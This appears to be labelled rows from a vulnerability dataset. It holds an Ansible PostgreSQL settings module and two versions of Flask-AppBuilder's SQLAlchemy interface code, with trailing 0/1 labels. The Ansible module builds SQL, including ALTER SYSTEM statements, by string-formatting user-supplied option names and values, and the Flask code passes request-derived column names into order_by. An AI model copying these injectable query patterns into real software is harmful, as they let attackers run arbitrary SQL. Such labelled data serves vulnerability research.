ANSIBLE_METADATA = {'status': ['stableinterface'],
                    'supported_by': 'community',
                    'version': '1.0'}


DOCUMENTATION = '''
---
module: postgresql_setting
short_description: manage config settings for PostgreSQL instance.
description:
  - Change server configuration parameters across the entire database cluster
  - New values will be effective after the next server configuration reload,
    or after the next server restart in the case of parameters that can only
    be changed at server start
  - Only superusers can change configuration settings
author: ""Kostiantyn Nemchenko (@kostiantyn-nemchenko)""
version_added: ""2.3""
requirements:
  - psycopg2
options:
  login_user:
    description:
      - The username used to authenticate with
    required: false
    default: null
  login_password:
    description:
      - The password used to authenticate with
    required: false
    default: null
  login_host:
    description:
      - Host running the database
    required: false
    default: localhost
  login_unix_socket:
    description:
      - Path to a Unix domain socket for local connections
    required: false
    default: null
  port:
    description:
      - Database port to connect to.
    required: false
    default: 5432
  option:
    description:
      - The parameter from PostgreSQL configuration file
    required: true
    default: null
  value:
    description:
      - The value of the parameter to change
    required: false
    default: null
  state:
    description:
      - The parameter state
    required: false
    default: present
    choices: [ ""present"", ""absent"" ]
'''


EXAMPLES = '''
# Set work_mem parameter to 8MB
- postgresql_setting:
    option: work_mem
    value: 8MB
    state: present

# Allow only local TCP/IP ""loopback"" connections to be made
- postgresql_setting:
    option: listen_addresses
    state: absent

# Enable autovacuum
- postgresql_setting:
    option: autovacuum
    value: on
'''


try:
    import psycopg2
    import psycopg2.extras
except ImportError:
    postgresqldb_found = False
else:
    postgresqldb_found = True
from ansible.module_utils.six import iteritems


class NotSupportedError(Exception):
    pass


# ===========================================
# PostgreSQL module specific support methods.
#

def option_ispreset(cursor, option):
    """"""Check if option is a preset parameter
    https://www.postgresql.org/docs/current/static/runtime-config-preset.html
    """"""
    query = """"""
    SELECT EXISTS
        (SELECT 1
         FROM pg_settings
         WHERE context = 'internal'
           AND name = '%s')
    """"""
    cursor.execute(query % option)
    return cursor.fetchone()[0]


def option_get_default_value(cursor, option):
    """"""Get parameter value assumed at server startup""""""
    query = """"""
    SELECT boot_val
    FROM pg_settings
    WHERE name = '%s'
    """"""
    cursor.execute(query % option)
    return cursor.fetchone()[0]


def option_isdefault(cursor, option):
    """"""Whether the parameter has not been changed since the last database start or
    configuration reload""""""
    query = """"""
    SELECT boot_val,
           reset_val
    FROM pg_settings
    WHERE name = '%s'
    """"""
    cursor.execute(query % option)
    rows = cursor.fetchone()
    if cursor.rowcount > 0:
        default_value, current_value = rows[0], rows[1]
        return default_value == current_value
    else:
        return False


def option_exists(cursor, option):
    """"""Check if such parameter exists""""""
    query = """"""
    SELECT name
    FROM pg_settings
    WHERE name = '%s'
    """"""
    cursor.execute(query % option)
    return cursor.rowcount > 0


def option_reset(cursor, option):
    """"""Reset parameter if it has non-default value""""""
    if not option_isdefault(cursor, option):
        query = ""ALTER SYSTEM SET %s TO '%s'""
        cursor.execute(query % (option,
                                option_get_default_value(cursor, option)))
        return True
    else:
        return False


def option_set(cursor, option, value):
    """"""Set new value for parameter""""""
    if not option_matches(cursor, option, value):
        query = ""ALTER SYSTEM SET %s TO '%s'""
        cursor.execute(query % (option, value))
        return True
    else:
        return False


def option_matches(cursor, option, value):
    """"""Check if setting matches the specified value""""""
    query = ""SELECT current_setting('%s') = '%s'""
    cursor.execute(query % (option, value))
    return cursor.fetchone()[0]


# ===========================================
# Module execution.
#


def main():
    module = AnsibleModule(
        argument_spec=dict(
            login_user=dict(default=""postgres""),
            login_password=dict(default="""", no_log=True),
            login_host=dict(default=""""),
            login_unix_socket=dict(default=""""),
            port=dict(default=""5432""),
            option=dict(required=True,
                        aliases=['name', 'setting', 'guc', 'parameter']),
            value=dict(default=""""),
            state=dict(default=""present"", choices=[""absent"", ""present""]),
        ),
        supports_check_mode=True
    )

    if not postgresqldb_found:
        module.fail_json(msg=""the python psycopg2 module is required"")

    option = module.params[""option""]
    value = module.params[""value""]
    port = module.params[""port""]
    state = module.params[""state""]
    changed = False

    # To use defaults values, keyword arguments must be absent, so
    # check which values are empty and don't include in the **kw
    # dictionary
    params_map = {
        ""login_host"": ""host"",
        ""login_user"": ""user"",
        ""login_password"": ""password"",
        ""port"": ""port""
    }
    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)
              if k in params_map and v != '')

    # If a login_unix_socket is specified, incorporate it here.
    if ""host"" not in kw or kw[""host""] == """" or kw[""host""] == ""localhost"":
        is_localhost = True
    else:
        is_localhost = False

    if is_localhost and module.params[""login_unix_socket""] != """":
        kw[""host""] = module.params[""login_unix_socket""]

    try:
        db_connection = psycopg2.connect(database=""postgres"", **kw)
        # Enable autocommit
        if psycopg2.__version__ >= '2.4.2':
            db_connection.autocommit = True
        else:
            db_connection.set_isolation_level(psycopg2
                                              .extensions
                                              .ISOLATION_LEVEL_AUTOCOMMIT)
        cursor = db_connection.cursor(
            cursor_factory=psycopg2.extras.DictCursor)
    except Exception:
        e = get_exception()
        module.fail_json(msg=""unable to connect to database: %s"" % e)

    try:
        if option_ispreset(cursor, option):
            module.warn(
                ""Option %s is preset, so it can only be set at initdb ""
                ""or before building from source code. For details, see ""
                ""postgresql.org/docs/current/static/runtime-config-preset.html""
                % option
            )
        elif option_exists(cursor, option):
            if module.check_mode:
                if state == ""absent"":
                    changed = not option_isdefault(cursor, option)
                elif state == ""present"":
                    changed = not option_matches(cursor, option, value)
                module.exit_json(changed=changed, option=option)

            if state == ""absent"":
                try:
                    changed = option_reset(cursor, option)
                except SQLParseError:
                    e = get_exception()
                    module.fail_json(msg=str(e))

            elif state == ""present"":
                try:
                    changed = option_set(cursor, option, value)
                except SQLParseError:
                    e = get_exception()
                    module.fail_json(msg=str(e))
        else:
            module.warn(""Option %s does not exist"" % option)
    except NotSupportedError:
        e = get_exception()
        module.fail_json(msg=str(e))
    except SystemExit:
        # Avoid catching this on Python 2.4
        raise
    except Exception:
        e = get_exception()
        module.fail_json(msg=""Database query failed: %s"" % e)

    module.exit_json(changed=changed, option=option)

# import module snippets
from ansible.module_utils.basic import *
from ansible.module_utils.database import *
if __name__ == '__main__':
    main()
/n/n/n",1
148,148,2158db051408e0d66210a99b17c121be008e20b6,"flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(""%s %s"" % (order_column, order_direction))
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/nflask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by


def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            order_direction = request.args.get('_od_' + re_match[0])
            if order_direction in ('asc', 'desc'):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",0
149,149,2158db051408e0d66210a99b17c121be008e20b6,"/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
